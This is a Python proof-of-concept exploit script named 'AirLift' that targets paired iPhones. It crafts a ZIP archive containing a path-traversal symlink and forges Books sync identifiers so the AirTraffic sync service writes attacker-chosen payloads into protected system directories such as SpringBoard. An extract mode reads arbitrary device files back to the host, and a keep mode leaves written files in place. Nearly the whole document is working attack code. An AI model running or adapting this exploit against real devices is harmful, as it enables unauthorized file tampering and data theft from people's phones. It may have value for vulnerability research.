#!/usr/bin/env python3
"""Fresh-file write and export-readback PoC for paired iPhones."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import re
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parent
TARGET_HEADER = ROOT / "Sources" / "airlift_target.h"
DEVICE_HELPER = ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "build" / "airtraffic_host"
TARGET_TEXT = TARGET_HEADER.read_text(encoding="utf-8")


def header_string(name: str) -> str:
    match = re.search(
        rf'^#define\s+{re.escape(name)}\s+@"([^"]*)"$',
        TARGET_TEXT,
        re.MULTILINE,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    return match.group(1)


def header_targets(name: str) -> tuple[tuple[str, str], ...]:
    match = re.search(
        rf"^#define\s+{re.escape(name)}\(X\)\s+(.*?)(?=^\s*$)",
        TARGET_TEXT,
        re.MULTILINE | re.DOTALL,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    targets = tuple(
        re.findall(r'X\(@"([^"]+)",\s*@"([^"]+)"\)', match.group(1))
    )
    if not targets:
        raise RuntimeError(f"empty {name} in {TARGET_HEADER}")
    return targets


TESTED_BUILDS = frozenset(header_targets("AIRLIFT_TESTED_BUILDS"))
SOURCE_PREFIX = header_string("AIRLIFT_SOURCE_PREFIX")
LINK_PREFIX = header_string("AIRLIFT_LINK_PREFIX")
RECOVERED_PREFIX = header_string("AIRLIFT_RECOVERED_PREFIX")
CANARY_PREFIX = header_string("AIRLIFT_CANARY_PREFIX")

DEFAULT_TARGET = "/var/mobile/Library/SpringBoard"


def split_file_target(target: str) -> tuple[str, str | None]:
    """Split target into (directory, leaf) when it looks like a file path."""
    basename = posixpath.basename(target)
    if "." in basename and not basename.startswith("."):
        directory = posixpath.dirname(target)
        if not directory or directory == "/":
            return target, None
        return directory, basename
    return target, None
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SZ_EXTRA_ID = 0x5A53


class AirLiftError(RuntimeError):
    def __init__(self, message: str, details: dict[str, Any] | None = None):
        super().__init__(message)
        self.details = details


def device_version(
    device_properties: dict[str, Any], properties: dict[str, Any]
) -> str:
    value = device_properties.get("osVersionNumber")
    if not isinstance(value, str):
        value = (
            properties.get("software", {})
            .get("osVersionNumber", {})
            .get("stringValue")
        )
    return value if isinstance(value, str) else "unknown"


def device_build(
    device_properties: dict[str, Any], properties: dict[str, Any]
) -> str:
    value = device_properties.get("osBuildUpdate")
    if not isinstance(value, str):
        value = (
            properties.get("software", {})
            .get("osBuildVersions", {})
            .get("buildVersion", {})
            .get("name")
        )
    return value if isinstance(value, str) else "unknown"


def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, Any]]:
    matches: list[dict[str, Any]] = []
    for device in devices:
        properties = device.get("properties", {})
        connection = device.get("connectionProperties")
        hardware = device.get("hardwareProperties")
        state = device.get("deviceProperties")
        if not isinstance(connection, dict):
            connection = properties.get("connection", {})
        if not isinstance(hardware, dict):
            hardware = properties.get("hardware", {})
        if not isinstance(state, dict):
            state = properties.get("state", {})

        udid = hardware.get("udid")
        product = hardware.get("productType")
        version = device_version(state, properties)
        build = device_build(state, properties)
        tested = (version, build) in TESTED_BUILDS
        if not (
            hardware.get("reality") == "physical"
            and connection.get("pairingState") == "paired"
            and isinstance(product, str)
            and product.startswith("iPhone")
            and isinstance(udid, str)
            and udid
        ):
            continue

        transport = {
            "localNetwork": "Wi-Fi",
            "wired": "USB",
        }.get(connection.get("transportType"), "paired")
        name = state.get("name")
        model = hardware.get("marketingName")
        matches.append(
            {
                "name": name if isinstance(name, str) and name else product,
                "model": model if isinstance(model, str) and model else product,
                "product": product,
                "version": version,
                "build": build,
                "transport": transport,
                "tested": tested,
                "udid": udid,
            }
        )
    return sorted(matches, key=lambda item: (item["name"], item["udid"]))


def selected_device(device: dict[str, Any]) -> dict[str, Any]:
    if not device["tested"]:
        print(
            f"Warning: {device['product']} on iOS {device['version']} "
            f"({device['build']}) is expected to work but has not been tested.",
            file=sys.stderr,
        )
    return device


def choose_device(
    devices: list[dict[str, Any]], requested: str | None
) -> dict[str, Any]:
    if not devices:
        raise AirLiftError("no paired physical iPhone found")

    if requested:
        for device in devices:
            if device["udid"].casefold() == requested.casefold():
                return selected_device(device)
        raise AirLiftError("requested device is not connected and compatible")

    if not sys.stdin.isatty():
        raise AirLiftError("device selection requires a terminal or --device UDID")

    print("Available compatible iPhones:", file=sys.stderr)
    for index, device in enumerate(devices, 1):
        print(f"  [{index}] {device['name']}", file=sys.stderr)
        print(
            f"      {device['model']} · iOS {device['version']} "
            f"({device['build']}) · "
            f"{device['transport']}",
            file=sys.stderr,
        )
        print(f"      {device['udid']}", file=sys.stderr)

    while True:
        print("Select device: ", end="", file=sys.stderr, flush=True)
        try:
            value = sys.stdin.readline()
        except KeyboardInterrupt as error:
            print(file=sys.stderr)
            raise AirLiftError("device selection cancelled") from error
        if not value:
            raise AirLiftError("device selection cancelled")
        try:
            selection = int(value.strip())
        except ValueError:
            selection = 0
        if 1 <= selection <= len(devices):
            return selected_device(devices[selection - 1])
        print(f"Enter a number from 1 to {len(devices)}.", file=sys.stderr)


def resolve_device(requested: str | None) -> dict[str, Any]:
    command = [
        "xcrun",
        "devicectl",
        "list",
        "devices",
        "--timeout",
        "8",
        "--quiet",
        "--json-output",
        "-",
    ]
    completed = subprocess.run(
        command,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=12,
    )
    devices = json.loads(completed.stdout)["result"]["devices"]
    return choose_device(available_devices(devices), requested)


def normalize_target(value: str) -> str:
    target = posixpath.normpath(value)
    if not target.startswith("/") or target == "/" or "\x00" in target:
        raise AirLiftError("target must be a non-root absolute directory")
    components = target[1:].split("/")
    if any(component in ("", ".", "..") for component in components):
        raise AirLiftError("target contains an unsafe path component")
    if len(target.encode()) > 768:
        raise AirLiftError("target path is too long")
    return target


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict[str, Any]:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result: dict[str, Any] | None = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            result = value
            break
    if result is None:
        raise AirLiftError(f"{Path(command[0]).name} returned no JSON result")
    result["exitCode"] = completed.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict[str, Any]:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def log(message: str, *, verbose_only: bool = False) -> None:
    if verbose_only and not _verbose:
        return
    print(message, file=sys.stderr)


_verbose = False


def error_details(error: Exception) -> dict[str, str]:
    return {"type": type(error).__name__, "message": str(error)}


def operation_ok(result: dict[str, Any]) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def preflight(udid: str) -> None:
    result = native("probe", udid)
    operation = result.get("operation", {})
    if not operation_ok(result):
        raise AirLiftError(
            "device/build preflight failed", {"preflight": result}
        )
    if operation.get("booksStagingAbsent") is not True:
        raise AirLiftError(
            "Books sync staging is already in use", {"preflight": result}
        )


def attempt(
    udid: str,
    target: str,
    leaf: str,
    payload: bytes,
    *,
    verbose: bool,
    keep: bool = False,
) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_path = posixpath.join(target, leaf)
    payload_identifier = f"../../{source}/payload"

    if keep:
        identifiers = [link_identifier, payload_identifier]
        destinations = [
            link_destination,
            posixpath.join(link_destination, leaf),
        ]
    else:
        target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)
        identifiers = [link_identifier, payload_identifier, target_identifier]
        destinations = [
            link_destination,
            posixpath.join(link_destination, leaf),
            recovered,
        ]

    with tempfile.TemporaryDirectory(prefix="airlift-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(build_archive(target, payload))
        books_path.write_bytes(build_books(identifiers))
        expected_path.write_bytes(payload)

        log("[*] Preflight check...", verbose_only=True)
        preflight(udid)
        stage: dict[str, Any] = {"operation": {"ok": False}}
        atc: dict[str, Any] = {"ok": False}
        finish: dict[str, Any] = {"operation": {"ok": False}}
        operation_error: Exception | None = None
        finish_error: Exception | None = None
        cleanup_authorized = False
        airtraffic_attempted = False
        try:
            log("[*] Staging payload via StreamingZip...")
            stage = native(
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
            )
            cleanup_authorized = bool(
                stage.get("operation", {}).get("cleanupAuthorized")
            )
            if operation_ok(stage):
                log("[+] Stage OK")
                log("[*] Triggering AirTraffic sync...")
                airtraffic_attempted = True
                command = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    command.extend((identifier, destination))
                atc = run_json(command, timeout=120)
                if atc.get("exitCode") == 0 and atc.get("ok"):
                    log("[+] AirTraffic sync OK")
                else:
                    log("[-] AirTraffic sync failed")
            else:
                log("[-] Stage failed")
        except Exception as error:
            log(f"[-] Error: {error}")
            operation_error = error
        finally:
            if cleanup_authorized:
                try:
                    if keep:
                        log("[*] Cleaning up staging artifacts (keeping target)...")
                    else:
                        log("[*] Verifying readback and cleaning up...")
                    finish = native(
                        "finish",
                        udid,
                        source,
                        link_destination,
                        recovered,
                        os.fspath(expected_path),
                        target[1:],
                        leaf,
                        "1" if airtraffic_attempted else "0",
                        "1" if keep else "0",
                    )
                except Exception as error:
                    log(f"[-] Finish error: {error}")
                    finish_error = error
            else:
                finish["operation"]["cleanupSkipped"] = True

    operation = finish.get("operation", {})
    result = {
        "stageSucceeded": operation_ok(stage),
        "airTrafficSucceeded": bool(atc.get("exitCode") == 0 and atc.get("ok")),
        "exactBytesRecovered": bool(operation.get("recoveredBytesMatch")),
        "cleanupComplete": bool(operation.get("cleanupComplete")),
        "targetAbsent": operation.get("targetAbsent"),
        "keepMode": keep,
    }
    if keep:
        attempt_ok = bool(
            result["stageSucceeded"]
            and result["airTrafficSucceeded"]
            and result["cleanupComplete"]
        )
    else:
        attempt_ok = bool(
            result["stageSucceeded"]
            and result["airTrafficSucceeded"]
            and result["exactBytesRecovered"]
            and result["cleanupComplete"]
        )
    if verbose or not attempt_ok:
        diagnostics: dict[str, Any] = {
            "stage": stage,
            "airTraffic": atc,
            "finish": finish,
        }
        if operation_error:
            diagnostics["operationError"] = error_details(operation_error)
        if finish_error:
            diagnostics["finishError"] = error_details(finish_error)
        result["diagnostics"] = diagnostics
    return result


def extract_attempt(
    udid: str,
    target: str,
    leaf: str,
    output_path: str,
    *,
    verbose: bool,
) -> dict[str, Any]:
    target_path = posixpath.join(target, leaf)
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)

    canary = f"airlift extract\nnonce={secrets.token_hex(24)}\n".encode()
    identifiers = [link_identifier, target_identifier]
    destinations = [link_destination, recovered]

    with tempfile.TemporaryDirectory(prefix="airlift-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        recovered_path = work / "recovered.bin"
        archive_path.write_bytes(build_archive(target, canary))
        books_path.write_bytes(build_books(identifiers))

        log("[*] Preflight check...", verbose_only=True)
        preflight(udid)
        stage: dict[str, Any] = {"operation": {"ok": False}}
        atc: dict[str, Any] = {"ok": False}
        extract_result: dict[str, Any] = {"operation": {"ok": False}}
        restore_result: dict[str, Any] = {}
        finish: dict[str, Any] = {"operation": {"ok": False}}
        cleanup_authorized = False
        extracted_ok = False
        try:
            log("[*] Staging symlink via StreamingZip...")
            stage = native(
                "stage", udid, source, link_destination, recovered,
                os.fspath(archive_path), os.fspath(books_path),
            )
            cleanup_authorized = bool(
                stage.get("operation", {}).get("cleanupAuthorized")
            )
            if operation_ok(stage):
                log("[+] Stage OK")
                log("[*] Triggering AirTraffic sync (moving target to recovered)...")
                command = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    command.extend((identifier, destination))
                atc = run_json(command, timeout=120)
                if atc.get("exitCode") == 0 and atc.get("ok"):
                    log("[+] AirTraffic sync OK")
                    log(f"[*] Reading recovered file via AFC...")
                    extract_result = native(
                        "extract", udid, recovered, leaf, output_path,
                    )
                    extract_op = extract_result.get("operation", {})
                    if extract_op.get("ok"):
                        size = extract_op.get("size", 0)
                        log(f"[+] Extracted {size} bytes → {output_path}")
                        extracted_ok = True
                    else:
                        reason = extract_op.get("reason", "unknown")
                        log(f"[-] Extract read failed: {reason}")
                else:
                    log("[-] AirTraffic sync failed")
            else:
                log("[-] Stage failed")
        except Exception as error:
            log(f"[-] Error: {error}")
        finally:
            if cleanup_authorized:
                log("[*] Cleaning up staging artifacts...")
                expected_path = work / "expected.bin"
                expected_path.write_bytes(canary)
                try:
                    finish = native(
                        "finish", udid, source, link_destination, recovered,
                        os.fspath(expected_path),
                        target[1:], leaf,
                        "0", "1",
                    )
                except Exception as error:
                    log(f"[-] Cleanup error: {error}")

            if extracted_ok:
                log("[*] Restoring original file to device...")
                try:
                    restore_result = attempt(
                        udid, target, leaf,
                        Path(output_path).read_bytes(),
                        verbose=verbose, keep=True,
                    )
                    if restore_result.get("airTrafficSucceeded"):
                        log("[+] Original file restored")
                    else:
                        log("[!] WARNING: could not restore file — "
                            "use --keep write to put it back manually")
                except Exception as error:
                    log(f"[!] WARNING: restore failed: {error}")

    extract_op = extract_result.get("operation", {})
    ok = extracted_ok
    result: dict[str, Any] = {
        "ok": ok,
        "extractedSize": extract_op.get("size", 0) if ok else 0,
        "outputPath": output_path if ok else None,
        "fileRestored": bool(restore_result.get("airTrafficSucceeded")),
    }
    if verbose or not ok:
        result["diagnostics"] = {
            "stage": stage,
            "airTraffic": atc,
            "extract": extract_result,
            "restore": restore_result,
            "finish": finish,
        }
    return result


def run(
    target: str,
    requested_device: str | None,
    *,
    verbose: bool,
    payload_file: str | None = None,
    keep: bool = False,
    extract: bool = False,
    output: str | None = None,
) -> dict[str, Any]:
    global _verbose
    _verbose = verbose
    if not DEVICE_HELPER.is_file() or not AIRTRAFFIC_HOST.is_file():
        raise AirLiftError("helpers are not built; run make first")

    device = resolve_device(requested_device)
    udid = device["udid"]
    build = device["build"]
    log(f"[*] Device: {device['name']} ({device['product']}) "
        f"iOS {device['version']} ({build})")

    target_dir, explicit_leaf = split_file_target(target)
    if explicit_leaf:
        leaf = explicit_leaf
    else:
        target_dir = target
        leaf = f"{CANARY_PREFIX}{secrets.token_hex(16)}.bin"

    target_file = posixpath.join(target_dir, leaf)
    log(f"[*] Target: {target_file}")

    if extract:
        if not explicit_leaf:
            raise AirLiftError("--extract requires a file path (with extension)")
        output_path = output or leaf
        log(f"[*] Mode: extract → {output_path}")
        preflight(udid)
        primary = extract_attempt(
            udid, target_dir, leaf, output_path, verbose=verbose,
        )
        ok = primary["ok"]
        if ok:
            log(f"[+] Success: extracted {target_file}")
        else:
            log(f"[-] Failed to extract {target_file}")
        return {
            "ok": ok,
            "mode": "extract",
            "device": {
                "product": device["product"],
                "version": device["version"],
                "build": build,
                "tested": device["tested"],
            },
            "targetFile": target_file,
            "outputPath": primary.get("outputPath"),
            "extractedSize": primary.get("extractedSize", 0),
            "primary": primary,
        }

    if payload_file:
        payload = Path(payload_file).read_bytes()
        if not payload:
            raise AirLiftError("payload file is empty")
        log(f"[*] Payload: {payload_file} ({len(payload)} bytes)")
    else:
        payload = (
            f"airlift canary\nbuild={build}\nnonce={secrets.token_hex(24)}\n"
        ).encode()
        log(f"[*] Payload: canary ({len(payload)} bytes)")

    if keep:
        log("[*] Mode: keep (file will remain on device)")

    preflight(udid)
    primary = attempt(
        udid, target_dir, leaf, payload, verbose=verbose, keep=keep,
    )
    if keep:
        ok = bool(
            primary["stageSucceeded"]
            and primary["airTrafficSucceeded"]
            and primary["cleanupComplete"]
        )
    else:
        exact = primary["exactBytesRecovered"]
        clean = primary["cleanupComplete"]
        ok = bool(exact and clean)
    if ok:
        log(f"[+] Success: {target_file}")
    else:
        log(f"[-] Failed: {target_file}")
    preflight(udid)
    return {
        "ok": ok,
        "device": {
            "product": device["product"],
            "version": device["version"],
            "build": build,
            "tested": device["tested"],
        },
        "targetDirectory": target_dir,
        "targetFile": posixpath.join(target_dir, leaf),
        "generatedLeaf": leaf,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "keepMode": keep,
        "newFileWrite": "confirmed" if (keep and ok) or (not keep and primary["exactBytesRecovered"]) else "not-confirmed",
        "exportRead": "skipped" if keep else ("confirmed" if primary["exactBytesRecovered"] else "not-confirmed"),
        "exactBytesRecovered": None if keep else primary["exactBytesRecovered"],
        "cleanupComplete": primary["cleanupComplete"],
        "existingFileTargeted": explicit_leaf is not None,
        "primary": primary,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--device", metavar="UDID", help="skip the device picker")
    parser.add_argument(
        "--payload-file", metavar="PATH", help="local file to use as payload"
    )
    parser.add_argument(
        "--keep", action="store_true", help="leave the written file on device"
    )
    parser.add_argument(
        "--extract", action="store_true",
        help="read the target file from device instead of writing",
    )
    parser.add_argument(
        "--output", metavar="PATH",
        help="local path to save extracted file (default: filename in cwd)",
    )
    parser.add_argument(
        "--verbose", action="store_true", help="include helper diagnostics"
    )
    arguments = parser.parse_args()
    try:
        result = run(
            normalize_target(arguments.target),
            arguments.device,
            verbose=arguments.verbose,
            payload_file=arguments.payload_file,
            keep=arguments.keep,
            extract=arguments.extract,
            output=arguments.output,
        )
    except (AirLiftError, OSError, subprocess.SubprocessError, ValueError) as error:
        result = {"ok": False, "error": str(error)}
        if isinstance(error, AirLiftError) and error.details:
            result["diagnostics"] = error.details
        print(json.dumps(result, sort_keys=True))
        return 1
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
